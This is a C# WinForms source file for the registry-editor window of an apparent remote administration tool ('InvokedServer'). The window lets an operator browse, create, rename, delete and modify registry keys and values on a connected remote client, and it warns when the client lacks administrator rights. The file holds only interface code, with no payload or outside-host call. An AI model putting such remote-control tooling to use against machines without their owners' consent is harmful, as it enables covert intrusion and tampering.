

using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Windows.Forms;
using InvokedCommon.Messages;
using InvokedCommon.Models;
using InvokedServer.Controls;
using InvokedServer.Extensions;
using InvokedServer.Helper;
using InvokedServer.Messages;
using InvokedServer.Networking;
using InvokedServer.Registry;
using Microsoft.Win32;


namespace InvokedServer.Forms
{
	public partial class FrmRegistryEditor : Form
	{
		private readonly Client _connectClient;
		private readonly RegistryHandler _registryHandler;
		private static readonly Dictionary<Client, FrmRegistryEditor> OpenedForms = new Dictionary<Client, FrmRegistryEditor>();

		public static FrmRegistryEditor CreateNewOrGetExisting(Client client)
		{
			if (FrmRegistryEditor.OpenedForms.ContainsKey(client))
				return FrmRegistryEditor.OpenedForms[client];
			FrmRegistryEditor newOrGetExisting = new FrmRegistryEditor(client);
			newOrGetExisting.Disposed += (EventHandler)((sender, args) => FrmRegistryEditor.OpenedForms.Remove(client));
			FrmRegistryEditor.OpenedForms.Add(client, newOrGetExisting);
			return newOrGetExisting;
		}

		public FrmRegistryEditor(Client client)
		{
			this._connectClient = client;
			this._registryHandler = new RegistryHandler(client);
			this.RegisterMessageHandler();
			this.InitializeComponent();
		}

		private void RegisterMessageHandler()
		{
			this._connectClient.ClientState += new Client.ClientStateEventHandler(this.ClientDisconnected);
			this._registryHandler.ProgressChanged += new MessageProcessorBase<string>.ReportProgressEventHandler(this.ShowErrorMessage);
			this._registryHandler.KeysReceived += new RegistryHandler.KeysReceivedEventHandler(this.AddKeys);
			this._registryHandler.KeyCreated += new RegistryHandler.KeyCreatedEventHandler(this.CreateNewKey);
			this._registryHandler.KeyDeleted += new RegistryHandler.KeyDeletedEventHandler(this.DeleteKey);
			this._registryHandler.KeyRenamed += new RegistryHandler.KeyRenamedEventHandler(this.RenameKey);
			this._registryHandler.ValueCreated += new RegistryHandler.ValueCreatedEventHandler(this.CreateValue);
			this._registryHandler.ValueDeleted += new RegistryHandler.ValueDeletedEventHandler(this.DeleteValue);
			this._registryHandler.ValueRenamed += new RegistryHandler.ValueRenamedEventHandler(this.RenameValue);
			this._registryHandler.ValueChanged += new RegistryHandler.ValueChangedEventHandler(this.ChangeValue);
			MessageHandler.Register((IMessageProcessor)this._registryHandler);
		}

		private void UnregisterMessageHandler()
		{
			MessageHandler.Unregister((IMessageProcessor)this._registryHandler);
			this._registryHandler.ProgressChanged -= new MessageProcessorBase<string>.ReportProgressEventHandler(this.ShowErrorMessage);
			this._registryHandler.KeysReceived -= new RegistryHandler.KeysReceivedEventHandler(this.AddKeys);
			this._registryHandler.KeyCreated -= new RegistryHandler.KeyCreatedEventHandler(this.CreateNewKey);
			this._registryHandler.KeyDeleted -= new RegistryHandler.KeyDeletedEventHandler(this.DeleteKey);
			this._registryHandler.KeyRenamed -= new RegistryHandler.KeyRenamedEventHandler(this.RenameKey);
			this._registryHandler.ValueCreated -= new RegistryHandler.ValueCreatedEventHandler(this.CreateValue);
			this._registryHandler.ValueDeleted -= new RegistryHandler.ValueDeletedEventHandler(this.DeleteValue);
			this._registryHandler.ValueRenamed -= new RegistryHandler.ValueRenamedEventHandler(this.RenameValue);
			this._registryHandler.ValueChanged -= new RegistryHandler.ValueChangedEventHandler(this.ChangeValue);
			this._connectClient.ClientState -= new Client.ClientStateEventHandler(this.ClientDisconnected);
		}

		private void ClientDisconnected(Client client, bool connected)
		{
			if (connected)
				return;
			this.Invoke(new MethodInvoker(((Form)this).Close));
		}

		protected override CreateParams CreateParams
		{
			get
			{
				CreateParams createParams = base.CreateParams;
				createParams.ExStyle |= 33554432;
				return createParams;
			}
		}

		private void FrmRegistryEditor_Load(object sender, EventArgs e)
		{
			if (this._connectClient.Value.AccountType != "Admin")
			{
				int num = (int)MessageBox.Show("The client software is not running as administrator and therefore some functionality like Update, Create, Open and Delete may not work properly!", "Alert!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
			}
			this.Text = WindowHelper.GetWindowTitle("Registry Editor", this._connectClient);
			this._registryHandler.LoadRegistryKey(null);
		}

		private void FrmRegistryEditor_FormClosing(object sender, FormClosingEventArgs e)
		{
			this.UnregisterMessageHandler();
		}

		private void ShowErrorMessage(object sender, string errorMsg)
		{
			int num = (int)MessageBox.Show(errorMsg, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}

		private void AddRootKey(RegSeekerMatch match)
		{
			TreeNode node = this.CreateNode(match.Key, match.Key, (object)match.Data);
			node.Nodes.Add(new TreeNode());
			this.tvRegistryDirectory.Nodes.Add(node);
		}

		private TreeNode AddKeyToTree(TreeNode parent, RegSeekerMatch subKey)
		{
			TreeNode node = this.CreateNode(subKey.Key, subKey.Key, (object)subKey.Data);
			parent.Nodes.Add(node);
			if (subKey.HasSubKeys)
				node.Nodes.Add(new TreeNode());
			return node;
		}

		private TreeNode CreateNode(string key, string text, object tag)
		{
			return new TreeNode()
			{
				Text = text,
				Name = key,
				Tag = tag
			};
		}

		private void AddKeys(object sender, string rootKey, RegSeekerMatch[] matches)
		{
			if (string.IsNullOrEmpty(rootKey))
			{
				this.tvRegistryDirectory.BeginUpdate();
				foreach (RegSeekerMatch match in matches)
					this.AddRootKey(match);
				this.tvRegistryDirectory.SelectedNode = this.tvRegistryDirectory.Nodes[0];
				this.tvRegistryDirectory.EndUpdate();
			}
			else
			{
				TreeNode treeNode = this.GetTreeNode(rootKey);
				if (treeNode == null)
					return;
				this.tvRegistryDirectory.BeginUpdate();
				foreach (RegSeekerMatch match in matches)
					this.AddKeyToTree(treeNode, match);
				treeNode.Expand();
				this.tvRegistryDirectory.EndUpdate();
			}
		}

		private void CreateNewKey(object sender, string rootKey, RegSeekerMatch match)
		{
			TreeNode tree = this.AddKeyToTree(this.GetTreeNode(rootKey), match);
			tree.EnsureVisible();
			this.tvRegistryDirectory.SelectedNode = tree;
			tree.Expand();
			this.tvRegistryDirectory.LabelEdit = true;
			tree.BeginEdit();
		}

		private void DeleteKey(object sender, string rootKey, string subKey)
		{
			TreeNode treeNode = this.GetTreeNode(rootKey);
			if (!treeNode.Nodes.ContainsKey(subKey))
				return;
			treeNode.Nodes.RemoveByKey(subKey);
		}

		private void RenameKey(object sender, string rootKey, string oldName, string newName)
		{
			TreeNode treeNode = this.GetTreeNode(rootKey);
			if (!treeNode.Nodes.ContainsKey(oldName))
				return;
			treeNode.Nodes[oldName].Text = newName;
			treeNode.Nodes[oldName].Name = newName;
			this.tvRegistryDirectory.SelectedNode = treeNode.Nodes[newName];
		}

		private TreeNode GetTreeNode(string path)
		{
			string[] strArray = path.Split('\\');
			TreeNode node = this.tvRegistryDirectory.Nodes[strArray[0]];
			if (node == null)
				return (TreeNode)null;
			for (int index = 1; index < strArray.Length; ++index)
			{
				node = node.Nodes[strArray[index]];
				if (node == null)
					return (TreeNode)null;
			}
			return node;
		}

		private void CreateValue(object sender, string keyPath, RegValueData value)
		{
			TreeNode treeNode = this.GetTreeNode(keyPath);
			if (treeNode == null)
				return;
			List<RegValueData> list = ((IEnumerable<RegValueData>)(RegValueData[])treeNode.Tag).ToList<RegValueData>();
			list.Add(value);
			treeNode.Tag = (object)list.ToArray();
			if (this.tvRegistryDirectory.SelectedNode == treeNode)
			{
				RegistryValueLstItem registryValueLstItem = new RegistryValueLstItem(value);
				this.lstRegistryValues.Items.Add((ListViewItem)registryValueLstItem);
				this.lstRegistryValues.SelectedIndices.Clear();
				registryValueLstItem.Selected = true;
				this.lstRegistryValues.LabelEdit = true;
				registryValueLstItem.BeginEdit();
			}
			this.tvRegistryDirectory.SelectedNode = treeNode;
		}

		private void DeleteValue(object sender, string keyPath, string valueName)
		{
			TreeNode treeNode = this.GetTreeNode(keyPath);
			if (treeNode == null)
				return;
			if (!RegValueHelper.IsDefaultValue(valueName))
			{
				treeNode.Tag = (object)((IEnumerable<RegValueData>)(RegValueData[])treeNode.Tag).Where<RegValueData>((Func<RegValueData, bool>)(value => value.Name != valueName)).ToArray<RegValueData>();
				if (this.tvRegistryDirectory.SelectedNode == treeNode)
					this.lstRegistryValues.Items.RemoveByKey(valueName);
			}
			else
			{
				RegValueData regValueData = ((IEnumerable<RegValueData>)(RegValueData[])treeNode.Tag).First<RegValueData>((Func<RegValueData, bool>)(item => item.Name == valueName));
				if (this.tvRegistryDirectory.SelectedNode == treeNode)
				{
					RegistryValueLstItem registryValueLstItem = this.lstRegistryValues.Items.Cast<RegistryValueLstItem>().SingleOrDefault<RegistryValueLstItem>((Func<RegistryValueLstItem, bool>)(item => item.Name == valueName));
					if (registryValueLstItem != null)
						registryValueLstItem.Data = regValueData.Kind.RegistryTypeToString((object)null);
				}
			}
			this.tvRegistryDirectory.SelectedNode = treeNode;
		}

		private void RenameValue(object sender, string keyPath, string oldName, string newName)
		{
			TreeNode treeNode = this.GetTreeNode(keyPath);
			if (treeNode == null)
				return;
			((IEnumerable<RegValueData>)(RegValueData[])treeNode.Tag).First<RegValueData>((Func<RegValueData, bool>)(item => item.Name == oldName)).Name = newName;
			if (this.tvRegistryDirectory.SelectedNode == treeNode)
			{
				RegistryValueLstItem registryValueLstItem = this.lstRegistryValues.Items.Cast<RegistryValueLstItem>().SingleOrDefault<RegistryValueLstItem>((Func<RegistryValueLstItem, bool>)(item => item.Name == oldName));
				if (registryValueLstItem != null)
					registryValueLstItem.RegName = newName;
			}
			this.tvRegistryDirectory.SelectedNode = treeNode;
		}

		private void ChangeValue(object sender, string keyPath, RegValueData value)
		{
			TreeNode treeNode = this.GetTreeNode(keyPath);
			if (treeNode == null)
				return;
			RegValueData dest = ((IEnumerable<RegValueData>)(RegValueData[])treeNode.Tag).First<RegValueData>((Func<RegValueData, bool>)(item => item.Name == value.Name));
			this.ChangeRegistryValue(value, dest);
			if (this.tvRegistryDirectory.SelectedNode == treeNode)
			{
				RegistryValueLstItem registryValueLstItem = this.lstRegistryValues.Items.Cast<RegistryValueLstItem>().SingleOrDefault<RegistryValueLstItem>((Func<RegistryValueLstItem, bool>)(item => item.Name == value.Name));
				if (registryValueLstItem != null)
					registryValueLstItem.Data = RegValueHelper.RegistryValueToString(value);
			}
			this.tvRegistryDirectory.SelectedNode = treeNode;
		}

		private void ChangeRegistryValue(RegValueData source, RegValueData dest)
		{
			if (source.Kind != dest.Kind)
				return;
			dest.Data = source.Data;
		}

		private void UpdateLstRegistryValues(TreeNode node)
		{
			this.selectedStripStatusLabel.Text = node.FullPath;
			this.PopulateLstRegistryValues((RegValueData[])node.Tag);
		}

		private void PopulateLstRegistryValues(RegValueData[] values)
		{
			this.lstRegistryValues.BeginUpdate();
			this.lstRegistryValues.Items.Clear();
			values = ((IEnumerable<RegValueData>)values).OrderBy<RegValueData, string>((Func<RegValueData, string>)(value => value.Name)).ToArray<RegValueData>();
			foreach (RegValueData regValueData in values)
				this.lstRegistryValues.Items.Add((ListViewItem)new RegistryValueLstItem(regValueData));
			this.lstRegistryValues.EndUpdate();
		}

		private void tvRegistryDirectory_AfterLabelEdit(object sender, NodeLabelEditEventArgs e)
		{
			if (e.Label != null)
			{
				e.CancelEdit = true;
				if (e.Label.Length > 0)
				{
					if (e.Node.Parent.Nodes.ContainsKey(e.Label))
					{
						int num = (int)MessageBox.Show("Invalid label. \nA node with that label already exists.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
						e.Node.BeginEdit();
					}
					else
					{
						this._registryHandler.RenameRegistryKey(e.Node.Parent.FullPath, e.Node.Name, e.Label);
						this.tvRegistryDirectory.LabelEdit = false;
					}
				}
				else
				{
					int num = (int)MessageBox.Show("Invalid label. \nThe label cannot be blank.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
					e.Node.BeginEdit();
				}
			}
			else
				this.tvRegistryDirectory.LabelEdit = false;
		}

		private void tvRegistryDirectory_BeforeExpand(object sender, TreeViewCancelEventArgs e)
		{
			TreeNode node = e.Node;
			if (!string.IsNullOrEmpty(node.FirstNode.Name))
				return;
			this.tvRegistryDirectory.SuspendLayout();
			node.Nodes.Clear();
			this._registryHandler.LoadRegistryKey(node.FullPath);
			this.tvRegistryDirectory.ResumeLayout();
			e.Cancel = true;
		}

		private void tvRegistryDirectory_NodeMouseClick(object sender, TreeNodeMouseClickEventArgs e)
		{
			if (e.Button != MouseButtons.Right)
				return;
			this.tvRegistryDirectory.SelectedNode = e.Node;
			Point position = new Point(e.X, e.Y);
			this.CreateTreeViewMenuStrip();
			this.tv_ContextMenuStrip.Show((Control)this.tvRegistryDirectory, position);
		}

		private void tvRegistryDirectory_BeforeSelect(object sender, TreeViewCancelEventArgs e)
		{
			this.UpdateLstRegistryValues(e.Node);
		}

		private void tvRegistryDirectory_KeyUp(object sender, KeyEventArgs e)
		{
			if (e.KeyCode != Keys.Delete || !this.GetDeleteState())
				return;
			this.deleteRegistryKey_Click((object)this, (EventArgs)e);
		}

		private void CreateEditToolStrip()
		{
			this.modifyToolStripMenuItem1.Visible = this.modifyBinaryDataToolStripMenuItem1.Visible = this.modifyNewtoolStripSeparator.Visible = this.lstRegistryValues.Focused;
			this.modifyToolStripMenuItem1.Enabled = this.modifyBinaryDataToolStripMenuItem1.Enabled = this.lstRegistryValues.SelectedItems.Count == 1;
			this.renameToolStripMenuItem2.Enabled = this.GetRenameState();
			this.deleteToolStripMenuItem2.Enabled = this.GetDeleteState();
		}

		private void CreateTreeViewMenuStrip()
		{
			this.renameToolStripMenuItem.Enabled = this.tvRegistryDirectory.SelectedNode.Parent != null;
			this.deleteToolStripMenuItem.Enabled = this.tvRegistryDirectory.SelectedNode.Parent != null;
		}

		private void CreateListViewMenuStrip()
		{
			this.modifyToolStripMenuItem.Enabled = this.modifyBinaryDataToolStripMenuItem.Enabled = this.lstRegistryValues.SelectedItems.Count == 1;
			this.renameToolStripMenuItem1.Enabled = this.lstRegistryValues.SelectedItems.Count == 1 && !RegValueHelper.IsDefaultValue(this.lstRegistryValues.SelectedItems[0].Name);
			this.deleteToolStripMenuItem1.Enabled = this.tvRegistryDirectory.SelectedNode != null && this.lstRegistryValues.SelectedItems.Count > 0;
		}

		private void editToolStripMenuItem_DropDownOpening(object sender, EventArgs e)
		{
			this.CreateEditToolStrip();
		}

		private void menuStripExit_Click(object sender, EventArgs e) => this.Close();

		private void menuStripDelete_Click(object sender, EventArgs e)
		{
			if (this.tvRegistryDirectory.Focused)
			{
				this.deleteRegistryKey_Click((object)this, e);
			}
			else
			{
				if (!this.lstRegistryValues.Focused)
					return;
				this.deleteRegistryValue_Click((object)this, e);
			}
		}

		private void menuStripRename_Click(object sender, EventArgs e)
		{
			if (this.tvRegistryDirectory.Focused)
			{
				this.renameRegistryKey_Click((object)this, e);
			}
			else
			{
				if (!this.lstRegistryValues.Focused)
					return;
				this.renameRegistryValue_Click((object)this, e);
			}
		}

		private void lstRegistryKeys_MouseClick(object sender, MouseEventArgs e)
		{
			if (e.Button != MouseButtons.Right)
				return;
			Point position = new Point(e.X, e.Y);
			if (this.lstRegistryValues.GetItemAt(position.X, position.Y) == null)
			{
				this.lst_ContextMenuStrip.Show((Control)this.lstRegistryValues, position);
			}
			else
			{
				this.CreateListViewMenuStrip();
				this.selectedItem_ContextMenuStrip.Show((Control)this.lstRegistryValues, position);
			}
		}

		private void lstRegistryKeys_AfterLabelEdit(object sender, LabelEditEventArgs e)
		{
			if (e.Label != null && this.tvRegistryDirectory.SelectedNode != null)
			{
				e.CancelEdit = true;
				int index = e.Item;
				if (e.Label.Length > 0)
				{
					if (this.lstRegistryValues.Items.ContainsKey(e.Label))
					{
						int num = (int)MessageBox.Show("Invalid label. \nA node with that label already exists.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
						this.lstRegistryValues.Items[index].BeginEdit();
					}
					else
					{
						this._registryHandler.RenameRegistryValue(this.tvRegistryDirectory.SelectedNode.FullPath, this.lstRegistryValues.Items[index].Name, e.Label);
						this.lstRegistryValues.LabelEdit = false;
					}
				}
				else
				{
					int num = (int)MessageBox.Show("Invalid label. \nThe label cannot be blank.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
					this.lstRegistryValues.Items[index].BeginEdit();
				}
			}
			else
				this.lstRegistryValues.LabelEdit = false;
		}

		private void lstRegistryKeys_KeyUp(object sender, KeyEventArgs e)
		{
			if (e.KeyCode != Keys.Delete || !this.GetDeleteState())
				return;
			this.deleteRegistryValue_Click((object)this, (EventArgs)e);
		}

		private void createNewRegistryKey_Click(object sender, EventArgs e)
		{
			if (!this.tvRegistryDirectory.SelectedNode.IsExpanded && this.tvRegistryDirectory.SelectedNode.Nodes.Count > 0)
			{
				this.tvRegistryDirectory.AfterExpand += new TreeViewEventHandler(this.createRegistryKey_AfterExpand);
				this.tvRegistryDirectory.SelectedNode.Expand();
			}
			else
				this._registryHandler.CreateRegistryKey(this.tvRegistryDirectory.SelectedNode.FullPath);
		}

		private void deleteRegistryKey_Click(object sender, EventArgs e)
		{
			if (MessageBox.Show("Are you sure you want to permanently delete this key and all of its subkeys?", "Confirm Key Delete", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) != DialogResult.Yes)
				return;
			this._registryHandler.DeleteRegistryKey(this.tvRegistryDirectory.SelectedNode.Parent.FullPath, this.tvRegistryDirectory.SelectedNode.Name);
		}

		private void renameRegistryKey_Click(object sender, EventArgs e)
		{
			this.tvRegistryDirectory.LabelEdit = true;
			this.tvRegistryDirectory.SelectedNode.BeginEdit();
		}

		private void createStringRegistryValue_Click(object sender, EventArgs e)
		{
			if (this.tvRegistryDirectory.SelectedNode == null)
				return;
			this._registryHandler.CreateRegistryValue(this.tvRegistryDirectory.SelectedNode.FullPath, RegistryValueKind.String);
		}

		private void createBinaryRegistryValue_Click(object sender, EventArgs e)
		{
			if (this.tvRegistryDirectory.SelectedNode == null)
				return;
			this._registryHandler.CreateRegistryValue(this.tvRegistryDirectory.SelectedNode.FullPath, RegistryValueKind.Binary);
		}

		private void createDwordRegistryValue_Click(object sender, EventArgs e)
		{
			if (this.tvRegistryDirectory.SelectedNode == null)
				return;
			this._registryHandler.CreateRegistryValue(this.tvRegistryDirectory.SelectedNode.FullPath, RegistryValueKind.DWord);
		}

		private void createQwordRegistryValue_Click(object sender, EventArgs e)
		{
			if (this.tvRegistryDirectory.SelectedNode == null)
				return;
			this._registryHandler.CreateRegistryValue(this.tvRegistryDirectory.SelectedNode.FullPath, RegistryValueKind.QWord);
		}

		private void createMultiStringRegistryValue_Click(object sender, EventArgs e)
		{
			if (this.tvRegistryDirectory.SelectedNode == null)
				return;
			this._registryHandler.CreateRegistryValue(this.tvRegistryDirectory.SelectedNode.FullPath, RegistryValueKind.MultiString);
		}

		private void createExpandStringRegistryValue_Click(object sender, EventArgs e)
		{
			if (this.tvRegistryDirectory.SelectedNode == null)
				return;
			this._registryHandler.CreateRegistryValue(this.tvRegistryDirectory.SelectedNode.FullPath, RegistryValueKind.ExpandString);
		}

		private void deleteRegistryValue_Click(object sender, EventArgs e)
		{
			if (MessageBox.Show("Deleting certain registry values could cause system instability. Are you sure you want to permanently delete " + (this.lstRegistryValues.SelectedItems.Count == 1 ? "this value?" : "these values?"), "Confirm Value Delete", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) != DialogResult.Yes)
				return;
			foreach (object selectedItem in this.lstRegistryValues.SelectedItems)
			{
				if (selectedItem.GetType() == typeof(RegistryValueLstItem))
					this._registryHandler.DeleteRegistryValue(this.tvRegistryDirectory.SelectedNode.FullPath, ((RegistryValueLstItem)selectedItem).RegName);
			}
		}

		private void renameRegistryValue_Click(object sender, EventArgs e)
		{
			this.lstRegistryValues.LabelEdit = true;
			this.lstRegistryValues.SelectedItems[0].BeginEdit();
		}

		private void modifyRegistryValue_Click(object sender, EventArgs e)
		{
			this.CreateEditForm(false);
		}

		private void modifyBinaryDataRegistryValue_Click(object sender, EventArgs e)
		{
			this.CreateEditForm(true);
		}

		private void createRegistryKey_AfterExpand(object sender, TreeViewEventArgs e)
		{
			if (e.Node != this.tvRegistryDirectory.SelectedNode)
				return;
			this.createNewRegistryKey_Click((object)this, (EventArgs)e);
			this.tvRegistryDirectory.AfterExpand -= new TreeViewEventHandler(this.createRegistryKey_AfterExpand);
		}

		private bool GetDeleteState()
		{
			if (this.lstRegistryValues.Focused)
				return this.lstRegistryValues.SelectedItems.Count > 0;
			return this.tvRegistryDirectory.Focused && this.tvRegistryDirectory.SelectedNode != null && this.tvRegistryDirectory.SelectedNode.Parent != null;
		}

		private bool GetRenameState()
		{
			return this.lstRegistryValues.Focused ? this.lstRegistryValues.SelectedItems.Count == 1 && !RegValueHelper.IsDefaultValue(this.lstRegistryValues.SelectedItems[0].Name) : this.tvRegistryDirectory.Focused && this.tvRegistryDirectory.SelectedNode != null && this.tvRegistryDirectory.SelectedNode.Parent != null;
		}

		private Form GetEditForm(RegValueData value, RegistryValueKind valueKind)
		{
			switch (valueKind)
			{
				case RegistryValueKind.String:
				case RegistryValueKind.ExpandString:
					return (Form)new FrmRegValueEditString(value);
				case RegistryValueKind.Binary:
					return (Form)new FrmRegValueEditBinary(value);
				case RegistryValueKind.DWord:
				case RegistryValueKind.QWord:
					return (Form)new FrmRegValueEditWord(value);
				case RegistryValueKind.MultiString:
					return (Form)new FrmRegValueEditMultiString(value);
				default:
					return (Form)null;
			}
		}

		private void CreateEditForm(bool isBinary)
		{
			string fullPath = this.tvRegistryDirectory.SelectedNode.FullPath;
			string name = this.lstRegistryValues.SelectedItems[0].Name;
			RegValueData regValueData = ((IEnumerable<RegValueData>)(RegValueData[])this.tvRegistryDirectory.SelectedNode.Tag).ToList<RegValueData>().Find((Predicate<RegValueData>)(item => item.Name == name));
			RegistryValueKind valueKind = isBinary ? RegistryValueKind.Binary : regValueData.Kind;
			using (Form editForm = this.GetEditForm(regValueData, valueKind))
			{
				if (editForm.ShowDialog() != DialogResult.OK)
					return;
				this._registryHandler.ChangeRegistryValue(fullPath, (RegValueData)editForm.Tag);
			}
		}
	}
}